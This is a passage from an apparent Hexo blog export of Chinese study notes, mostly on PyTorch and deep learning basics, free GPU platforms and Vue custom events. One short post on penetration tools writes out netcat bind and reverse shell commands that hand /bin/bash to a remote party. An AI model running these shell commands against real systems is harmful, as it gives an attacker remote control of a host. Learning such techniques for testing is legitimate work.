<p><strong>输出层</strong><br>输出层由输出数据的节点组成。输出 “是” 或 “否” 答案的深度学习模型在输出层中只有两个节点。那些输出更广泛答案的模型则有更多的节点。 </p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
  </entry>
  <entry>
    <title>深度学习速成get知识点</title>
    <url>/posts/a702fcb0/</url>
    <content><![CDATA[<ol>
<li><p>dir()<br>它可以展示一个package中所有的方法和类，以列的方式展示出来。</p>
</li>
<li><p>help()<br>它可以具体展示某个方法或者类的使用说明，也可以使用<code>方法??</code>后面接两个问号的方式，实现提示功能</p>
</li>
<li><p>jupyter，python console，python文件的区别和使用<br>python文件：他会将所有内容都重新编译运行，比较耗时，适合完整的大型项目<br>jupyter，python console：都可以将每一个python语句拆分成任意块去单独执行。执行速度快。不会重复运行<br>但是python console如果出了错误。会很影响阅读体验。因此常用来做测试<br>而jupyter有着文字和代码共存的特性适合用来做笔记和学习</p>
</li>
<li><p>TensorBoard的使用<br>他可以将数据转化成图表类型，更加的可观，明了。<br>例1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"><span class="comment"># from read_image import img_array</span></span><br><span class="line">writer = SummaryWriter(<span class="string">&quot;logs&quot;</span>) <span class="comment"># 他会生成这个文件夹，并在close后写入数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(type(img_array))</span></span><br><span class="line"><span class="comment"># print(img_array.shape)</span></span><br><span class="line"><span class="comment"># writer.add_image(&quot;test&quot;,img_array,1,dataformats=&#x27;HWC&#x27;)</span></span><br><span class="line"><span class="comment"># y = x</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    writer.add_scalar(<span class="string">&quot;y=2x&quot;</span>,<span class="number">2</span>*i,i)</span><br><span class="line"></span><br><span class="line">writer.close()</span><br></pre></td></tr></table></figure>
<p>然后在cmd窗口打开tensorboard，使用该命令<code>tensorboard --logdir=logs --port=6006</code>，他默认端口为6006<br><img src="https://image.zfxt.top/hexo-blog/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E9%80%9F%E6%88%90get%E7%9F%A5%E8%AF%86%E7%82%B9-2023-10-02-43-42.png"><br>同样的，可以添加图片，即将上述代码的注释去除。<br>并带上这些读取图片的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">image_path = <span class="string">&quot;data/train/ants-image/0013035.jpg&quot;</span></span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line"></span><br><span class="line">img_array = np.array(img)</span><br></pre></td></tr></table></figure>
<p>因为tensorboard读取图片只能使用固定的两种格式的数据，因此我们采用numpy格式的图片读入</p>
</li>
<li><p>transforms<br>他的本质就是一个强大的工具类，我们通过具体化这些工具类，并生成自己需要的工具，然后使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tenser数据类型：通过transforms.ToTenser去实现</span></span><br><span class="line"><span class="comment"># tenser数据类型：就是一个包装了反向神经网络所需要的参数的数据类型</span></span><br><span class="line">img_path = <span class="string">&quot;data/train/ants-image/0013035.jpg&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(img_path)</span><br><span class="line"><span class="comment"># print(img)</span></span><br><span class="line">tensor_trains = transforms.ToTensor()</span><br><span class="line"></span><br><span class="line">tensor_img = tensor_trains(img)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(tensor_img)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="常用的transforms"><a href="#常用的transforms" class="headerlink" title="常用的transforms"></a>常用的transforms</h2><p><img src="https://image.zfxt.top/hexo-blog/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E9%80%9F%E6%88%90get%E7%9F%A5%E8%AF%86%E7%82%B9-2023-10-06-33-28.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"></span><br><span class="line">writer = SummaryWriter(<span class="string">&quot;logs&quot;</span>)</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;images/15.jpg&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ToTensor的使用</span></span><br><span class="line">trans_totensor = transforms.ToTensor()</span><br><span class="line">img_tensor = trans_totensor(img)</span><br><span class="line">writer.add_image(<span class="string">&quot;ToTensor&quot;</span>, img_tensor)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Normalize</span></span><br><span class="line"><span class="built_in">print</span>(img_tensor[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">trans_morm = transforms.Normalize([<span class="number">0.2</span>, <span class="number">1.3</span>, <span class="number">2.1</span>], [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>])</span><br><span class="line">img_norm = trans_morm(img_tensor)</span><br><span class="line"><span class="built_in">print</span>(img_norm[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">writer.add_image(<span class="string">&quot;Normalize&quot;</span>, img_norm, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Resize</span></span><br><span class="line"><span class="built_in">print</span>(img.size)</span><br><span class="line">trans_resize = transforms.Resize((<span class="number">512</span>, <span class="number">512</span>))</span><br><span class="line"><span class="comment"># img PIL -&gt; resize -&gt; img_resize PIL</span></span><br><span class="line">img_resize = trans_resize(img)</span><br><span class="line"><span class="comment"># img_resize PIL -&gt; totensor -&gt; img_resize tensor</span></span><br><span class="line">img_resize = trans_totensor(img_resize)</span><br><span class="line">writer.add_image(<span class="string">&quot;Resize&quot;</span>, img_resize, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Compose -resize -2</span></span><br><span class="line">trans_resize_2 = transforms.Resize(<span class="number">512</span>)</span><br><span class="line">trans_compose = transforms.Compose([trans_resize_2, trans_totensor])</span><br><span class="line">img_resize_2 = trans_compose(img)</span><br><span class="line">writer.add_image(<span class="string">&quot;Resize&quot;</span>, img_resize_2, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># RandomCrop</span></span><br><span class="line">trans_random = transforms.RandomCrop((<span class="number">512</span>, <span class="number">800</span>))</span><br><span class="line">trans_compose_2 = transforms.Compose([trans_random, trans_totensor])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    img_crop = trans_compose_2(img)</span><br><span class="line">    writer.add_image(<span class="string">&quot;RandomCropHW&quot;</span>, img_crop, i)</span><br><span class="line">writer.close()</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>dataset的使用例子<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyData</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,root_dir,label_dir</span>):</span><br><span class="line">        <span class="variable language_">self</span>.root_dir = root_dir</span><br><span class="line">        <span class="variable language_">self</span>.label_dir = label_dir</span><br><span class="line">        <span class="variable language_">self</span>.path = os.path.join(root_dir,label_dir)</span><br><span class="line">        <span class="variable language_">self</span>.img_path = os.listdir(<span class="variable language_">self</span>.path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        img_name = <span class="variable language_">self</span>.img_path[index]</span><br><span class="line">        img_item_path = os.path.join(<span class="variable language_">self</span>.path,img_name)</span><br><span class="line">        img = Image.<span class="built_in">open</span>(img_item_path)</span><br><span class="line">        label = <span class="variable language_">self</span>.label_dir</span><br><span class="line">        <span class="keyword">return</span> img,label</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.img_path)</span><br><span class="line"></span><br><span class="line">root_dir = <span class="string">&quot;dataset/train&quot;</span></span><br><span class="line">ants_label_dir = <span class="string">&quot;ants&quot;</span></span><br><span class="line">bees_label_dir = <span class="string">&quot;bees&quot;</span></span><br><span class="line">ants_dataset = MyData(root_dir,ants_label_dir)</span><br><span class="line">bees_dataset = MyData(root_dir,bees_label_dir)</span><br><span class="line"></span><br><span class="line">train_dataset = ants_dataset+bees_dataset</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="dataset-和-dataloader"><a href="#dataset-和-dataloader" class="headerlink" title="dataset 和 dataloader"></a>dataset 和 dataloader</h1><p>dataset就是一个数据集。而dataloader是用来从dataset中取数据的一个工具</p>
<h1 id="模型的保存和读取"><a href="#模型的保存和读取" class="headerlink" title="模型的保存和读取"></a>模型的保存和读取</h1><h2 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h2><p><img src="https://image.zfxt.top/hexo-blog/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E9%80%9F%E6%88%90get%E7%9F%A5%E8%AF%86%E7%82%B9-2023-10-21-41-17.png"></p>
<h2 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h2><p><img src="https://image.zfxt.top/hexo-blog/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E9%80%9F%E6%88%90get%E7%9F%A5%E8%AF%86%E7%82%B9-2023-10-18-26-06.png"><br><img src="https://image.zfxt.top/hexo-blog/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E9%80%9F%E6%88%90get%E7%9F%A5%E8%AF%86%E7%82%B9-2023-10-14-37-55.png"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>白嫖GPU来跑机器学习</title>
    <url>/posts/37284e3f/</url>
    <content><![CDATA[<h2 id="google-colab"><a href="#google-colab" class="headerlink" title="google colab"></a>google colab</h2><p><a href="https://colab.research.google.com/">地址</a><br>使用google的服务的话，需要有一些科学工具来帮忙，这些我默认你们都知道了<br><img src="https://image.zfxt.top/hexo-blog/%E7%99%BD%E5%AB%96GPU%E6%9D%A5%E8%B7%91%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-2024-12-24-22-25-26.png" alt="白嫖GPU来跑机器学习-2024-12-24-22-25-26"><br>在这里第一个选项可以启动服务，第二个选项可以修改GPU的类型，因为是免费的，所以只有很少的选项：<br><img src="https://image.zfxt.top/hexo-blog/%E7%99%BD%E5%AB%96GPU%E6%9D%A5%E8%B7%91%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-2024-12-24-22-26-34.png" alt="白嫖GPU来跑机器学习-2024-12-24-22-26-34"></p>
<p>他用来跑服务的话，俺记得是一次不能超过6个小时，你需要访问数据集的话，可以通过Google 硬盘来加载。</p>
<h2 id="kaggle"><a href="#kaggle" class="headerlink" title="kaggle"></a>kaggle</h2><p><a href="https://www.kaggle.com/">地址</a><br>这也是一个国外的白嫖gpu的平台，他的限额是每周30个小时，对于初学者而言已经绰绰有余了。而且他支持离线运行，即便你因为网络不稳定而掉线。他也会稳定在后台跑完，并完成数据的输出。<br><img src="https://image.zfxt.top/hexo-blog/%E7%99%BD%E5%AB%96GPU%E6%9D%A5%E8%B7%91%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-2024-12-24-22-29-27.png" alt="白嫖GPU来跑机器学习-2024-12-24-22-29-27"><br>这里是它可以白嫖使用的一些GPU。</p>
<h2 id="天池notebook"><a href="#天池notebook" class="headerlink" title="天池notebook"></a>天池notebook</h2><p><a href="https://tianchi.aliyun.com/">地址</a><br>他的优点就是国内平台，可以很快捷的访问。<br><img src="https://image.zfxt.top/hexo-blog/%E7%99%BD%E5%AB%96GPU%E6%9D%A5%E8%B7%91%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-2024-12-24-22-31-12.png" alt="白嫖GPU来跑机器学习-2024-12-24-22-31-12"><br>他提供每个月60个小时的额度，如果不够用你再考虑使用kaggle等其他的。</p>
<p>以上</p>
]]></content>
      <categories>
        <category>白嫖</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>百度网盘极速下载：IDM+油猴插件</title>
    <url>/posts/d6483f91/</url>
    <content><![CDATA[<p>百度网盘快速下载方法：<br>首先，该方法的前提条件是IDM和网页版百度网盘</p>
<ol>
<li>你需要下载油猴，并在油猴中添加一个插件<br>百度网盘千千下载助手，这里是<a href="https://greasyfork.org/scripts/463171-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E5%8D%83%E5%8D%83%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B/code/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E5%8D%83%E5%8D%83%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B.user.js">快速下载链接</a><blockquote>
<p>但我要差一嘴，其实这个插件最初是软件小妹进行运维的，后来百度严查，软件小妹就没再运维了。不知道为何被千千下载助手获取。但这并不影响我们白嫖这个好用的插件。</p>
</blockquote>
</li>
<li>进入百度网盘网页版界面，打开油猴，他会有一系列提示。下载器有IDM和Aria2两种，推荐IDM。后续方法可以直接看网页的提示了。这里不再多言。</li>
</ol>
]]></content>
      <tags>
        <tag>黑科技</tag>
      </tags>
  </entry>
  <entry>
    <title>知乎：科学普及对科学发展的必要性</title>
    <url>/posts/735b0735/</url>
    <content><![CDATA[<blockquote>
<p>引用自<a href="https://zhuanlan.zhihu.com/p/53260098">https://zhuanlan.zhihu.com/p/53260098</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>k8s</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>神经网络和深度学习</title>
    <url>/posts/2875a41b/</url>
    <content><![CDATA[<h1 id="什么是神经网络？"><a href="#什么是神经网络？" class="headerlink" title="什么是神经网络？"></a>什么是神经网络？</h1><p>我们常常用深度学习这个术语来指训练神经网络的过程。<br>神经网络就是一个通过深度学习构建出来的大规模函数。可以通过任意x得到一个想要的结果y<br><strong>ReLU激活函数</strong>：全称是<strong>Rectified Linear Unit</strong>。可以理解成max(0,x)，这也是你得到一个这种形状的函数的原因。</p>
<h2 id="神经网络的监督学习"><a href="#神经网络的监督学习" class="headerlink" title="神经网络的监督学习"></a>神经网络的监督学习</h2><p>对于一个神经网络的训练过程，人为的设定某些需要的参数和结果。用来导向神经网络的发展方向。<br>对于图像应用，我们经常在神经网络上使用卷积（<strong>Convolutional Neural Network</strong>），通常缩写为<strong>CNN</strong><br>对于序列数据，经常使用<strong>RNN</strong>，一种递归神经网络（<strong>Recurrent Neural Network</strong>）</p>
<p>从历史经验上看，处理非结构化数据是很难的，与结构化数据比较，让计算机理解非结构化数据很难</p>
<blockquote>
<p><strong>神经网络规模和其准确性的关系图</strong><br><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-06-44-20.png"></p>
</blockquote>
<p>神经网络方面的一个巨大突破是从sigmoid函数转换到一个ReLU函数<br><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-18-34-02.png"></p>
<p>通过不断修改算法，代码中的细节。来不断提搞构建高效的神经网络。<br><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-05-04-37.png"></p>
<h1 id="神经网络的编程基础"><a href="#神经网络的编程基础" class="headerlink" title="神经网络的编程基础"></a>神经网络的编程基础</h1><h2 id="二分类-Binary-Classification"><a href="#二分类-Binary-Classification" class="headerlink" title="二分类(Binary Classification)"></a>二分类(Binary Classification)</h2><p>神经网络的训练过程可以分为<strong>前向传播</strong>和<strong>反向传播</strong>两个独立的部分<br>前向传播就是根据训练集得到代价函数。<br>反向传播再通过最小化代价函数解的之前的参数。</p>
<h2 id="逻辑回归-Logistic-Regression"><a href="#逻辑回归-Logistic-Regression" class="headerlink" title="逻辑回归(Logistic Regression)"></a>逻辑回归(Logistic Regression)</h2><p><strong>逻辑回归(logistic regression)<strong>是一个用于二分类(binary classification)的算法<br><strong>Hypothesis Function</strong>（假设函数）：<br><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-18-50-01.png"><br>将ReLu函数重新变为</strong>sigmoid</strong>函数</p>
<p>##逻辑回归的代价函数（Logistic Regression Cost Function）<br>训练参数w和参数b，你需要定义一个代价函数</p>
<p>逻辑回归的输出函数:<br><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-08-30-29.png"></p>
<p>损失函数又叫做误差函数，用来衡量算法的运行情况，<strong>Loss function</strong><br>一般我们用预测值和实际值的平方差或者它们平方差的一半，但是通常在逻辑回归中我们不这么做，因为当我们在学习逻辑回归参数的时候，会发现我们的优化目标不是凸优化，只能找到多个局部最优值，梯度下降法很可能找不到全局最优值，虽然平方差是一个不错的损失函数，但是我们在逻辑回归模型中会定义另外一个损失函数。</p>
<p>逻辑回归可以看做是一个非常小的神经网络</p>
<h2 id="梯度下降法（Gradient-Descent）"><a href="#梯度下降法（Gradient-Descent）" class="headerlink" title="梯度下降法（Gradient Descent）"></a>梯度下降法（Gradient Descent）</h2><p>在你测试集上，通过最小化代价函数（成本函数）J(w,b)来训练的参数w和参数b，<br><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-19-07-32.png"></p>
<p><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-08-55-05.png"></p>
<p>由于逻辑回归函数的代价函数，J(w,b)的特性，我们必须定义其为凸函数。也就是<br><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-19-29-54.png"><br>形如此<br>如果是非凸，则有多个局部最小值，无法得出结果<br><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-14-45-55.png"><br>梯度下降通过不断迭代参数w，b来找到最小的成本函数J(w,b)<br><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-00-52-14.png"></p>
<h2 id="使用计算图求导数（Derivatives-with-a-Computation-Graph）"><a href="#使用计算图求导数（Derivatives-with-a-Computation-Graph）" class="headerlink" title="使用计算图求导数（Derivatives with a Computation Graph）"></a>使用计算图求导数（Derivatives with a Computation Graph）</h2><p>正向或者说从左到右的计算来计算成本函数J，你可能需要优化的函数，然后反向从右到左计算导数</p>
<h2 id="逻辑回归中的梯度下降（Logistic-Regression-Gradient-Descent）"><a href="#逻辑回归中的梯度下降（Logistic-Regression-Gradient-Descent）" class="headerlink" title="逻辑回归中的梯度下降（Logistic Regression Gradient Descent）"></a>逻辑回归中的梯度下降（Logistic Regression Gradient Descent）</h2><p>通过计算偏导数来实现逻辑回归的梯度下降算法</p>
<p>1.<br><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-01-35-44.png"><br><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-00-06-28.png"><br><img src="https://image.zfxt.top/hexo-blog/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2023-09-11-51-16.png"></p>
<p>一个示例代码流程：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">J=<span class="number">0</span>;dw1=<span class="number">0</span>;dw2=<span class="number">0</span>;db=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span> to m</span><br><span class="line">    z(i) = wx(i)+b;</span><br><span class="line">    a(i) = sigmoid(z(i));</span><br><span class="line">    J += -[y(i)log(a(i))+(<span class="number">1</span>-y(i)）log(<span class="number">1</span>-a(i));</span><br><span class="line">    dz(i) = a(i)-y(i);</span><br><span class="line">    dw1 += x1(i)dz(i);</span><br><span class="line">    dw2 += x2(i)dz(i);</span><br><span class="line">    db += dz(i);</span><br><span class="line">J/= m;</span><br><span class="line">dw1/= m;</span><br><span class="line">dw2/= m;</span><br><span class="line">db/= m;</span><br><span class="line">w=w-alpha*dw</span><br><span class="line">b=b-alpha*db</span><br></pre></td></tr></table></figure>
<p>当你应用深度学习算法，你会发现在代码中显式地使用for循环使你的算法很低效，同时在深度学习领域会有越来越大的数据集。所以能够应用你的算法且没有显式的for循环会是重要的，并且会帮助你适用于更大的数据集。所以这里有一些叫做<strong>向量化技术</strong>,它可以允许你的代码摆脱这些显式的for循环。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>系统环境变量与用户环境变量的配置区别</title>
    <url>/posts/a2be5f61/</url>
    <content><![CDATA[<ul>
<li>作用域：<br>&#x2F;etc&#x2F;profile的作用域是全局的，涉及系统级的环境变量和启动程序<br>而~&#x2F;.bashrc往往是在用户目录下，只对登录的用户有效。</li>
<li>profile只在登录时执行一遍，之后添加内容的话，需要source刷新才能访问到添加的内容。<br>而.bashrc更新完后，执行一次脚本就会更新。#linux</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>网络渗透工具</title>
    <url>/posts/cc7117f6/</url>
    <content><![CDATA[<h2 id="棱角社区"><a href="#棱角社区" class="headerlink" title="棱角社区"></a>棱角社区</h2><p>这里面有很多方便快捷的工具和命令，帮助我们完成包括文件上传和反弹shell的操作。<br><a href="https://forum.ywhack.com/bountytips.php">棱角社区</a></p>
<h2 id="ncat命令使用"><a href="#ncat命令使用" class="headerlink" title="ncat命令使用"></a>ncat命令使用</h2><p>他的主要作用是反弹shell。那么就会有两种方式：</p>
<h3 id="正向反弹"><a href="#正向反弹" class="headerlink" title="正向反弹"></a>正向反弹</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控制端</span></span><br><span class="line">nc -lvp &lt;PORT&gt; -e /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端</span></span><br><span class="line">nc &lt;IP&gt; &lt;PORT&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="反向反弹"><a href="#反向反弹" class="headerlink" title="反向反弹"></a>反向反弹</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控制端</span></span><br><span class="line">nc -e /bin/bash &lt;IP&gt; &lt;PORT&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端</span></span><br><span class="line">nc -lvp &lt;PORT&gt;</span><br></pre></td></tr></table></figure>

<p>不可否认的就是一定是被控制端将bash的权限交出来。但是正向和反向取决于是我们监听还是被监听。</p>
]]></content>
      <tags>
        <tag>网络渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>组件自定义事件：提高模块化，增强父子通信</title>
    <url>/posts/3bb575f6/</url>
    <content><![CDATA[<h2 id="组件的自定义事件"><a href="#组件的自定义事件" class="headerlink" title="组件的自定义事件"></a>组件的自定义事件</h2><blockquote>
<p>父子之间传值来引入问题。<br>在以往的方法中，要从父往子传值，可以使用props，直接传值。从子向父传值，需要将父的方法通过props传递给子，然后子接收后调用方法。然后完成传值。但是这样子操作耦合性太强，不好分离模块化。<br>因此引入一个新的写法。组件自定义事件。<br>写法：</p>
</blockquote>
<ol>
<li>v-on方法。直接在子组件的标签上绑定上自定义事件，并于自己的方法绑定。<br>例：<code>&lt;Student v-on:action=&quot;getStudentName&quot;/&gt;</code>其中<code>action</code>是我们自定义的事件名，他会和 <code>Student</code>相关联。然后被绑定到父组件的<code>getStudnetName</code>方法上。<em><strong>注意：他会将action自定义事件绑定再vc标签所对应的vc实例上。</strong></em><br>其次，再在<code>Student</code>组件中，你需要定义一个方法，绑定一个按钮或者什么事件来触发方法，用这个方法来触发你所自定义的事件,然后与父组件的方法联动使用。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button @click = &quot;getName&quot;&gt;点我&lt;/button&gt;</span><br><span class="line">....</span><br><span class="line">methods:&#123;</span><br><span class="line">  getName()&#123;</span><br><span class="line">    this.$emit(&#x27;action&#x27;)//你所绑定的自定义事件action</span><br><span class="line">    this.$emit(&#x27;badspider&#x27;,this.name,2,3,4,1,4,2)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><ol>
<li>我们目前所使用的都是直接绑定v-on:action，就是直接绑定了事件，倘若我们不需要直接绑定自定义事件，或者延时绑定的话，可以在父组件中写一个钩子，通过ref直接获取子组件再来进行绑定。<blockquote>
<h4 id="ref属性，可以直接获取子组件的实例对象"><a href="#ref属性，可以直接获取子组件的实例对象" class="headerlink" title="ref属性，可以直接获取子组件的实例对象"></a>ref属性，可以直接获取子组件的实例对象</h4></blockquote>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Student ref=&quot;student&quot;&gt;</span><br><span class="line">//通过this.$refs.student获取该实例对象</span><br></pre></td></tr></table></figure>
<h4 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h4><p><img src="/./o/r/32/f171ec5c-e320-4c69-8474-4ae87f02b70e/1682052087_image.png" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mountd()&#123;</span><br><span class="line">  this.$refs.student.$on(&#x27;action&#x27;,this.getStudentName)</span><br><span class="line">//获取该实例对象，然后绑定自定义事件和方法</span><br><span class="line">&#125;</span><br><span class="line">//也可以不写方法来绑定，而是直接绑定一个方法</span><br><span class="line">mountd()&#123;</span><br><span class="line">  this.$refs.student.$on(&#x27;action&#x27;,()=&gt;&#123;this.Item = ...&#125;)</span><br><span class="line">//注意，用$on绑定后，默认会传递回他本来的`this`即`Student`，所以这里使用括号函数，让`this`指向`App`.</span><br><span class="line">&#125;</span><br><span class="line">//若是只想绑定后只触发一次，可以有一下两种操作</span><br><span class="line">@action.once或者this.$refs.student.$once()</span><br><span class="line">这两种都可以只触发一次</span><br></pre></td></tr></table></figure>
<p>所有在组件标签上的事件都会被vue认为时自定义事件，为了可以定义js原生的事件例如click,可以加入.native<br>例如<code>&lt;Student @click.native=&quot;getStudentName&quot;&gt;&lt;/Student&gt;</code></p>
<h3 id="解除绑定使用-off"><a href="#解除绑定使用-off" class="headerlink" title="解除绑定使用$off()"></a>解除绑定使用$off()</h3><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p><img src="/./o/r/33/162db9b6-eed8-457e-b842-4a606bf2c750/1682053814_%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="image"><br><code>this.$destroy()</code><br>他的销毁过程不会破坏他本身的dom节点，即你给一个点击事件绑定了一个方法，他依然会有点击事件发生，但他所绑定的自定义事件都不会发生了,他绑定的方法任然存在</p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>自部署gitea</title>
    <url>/posts/2fecdaca/</url>
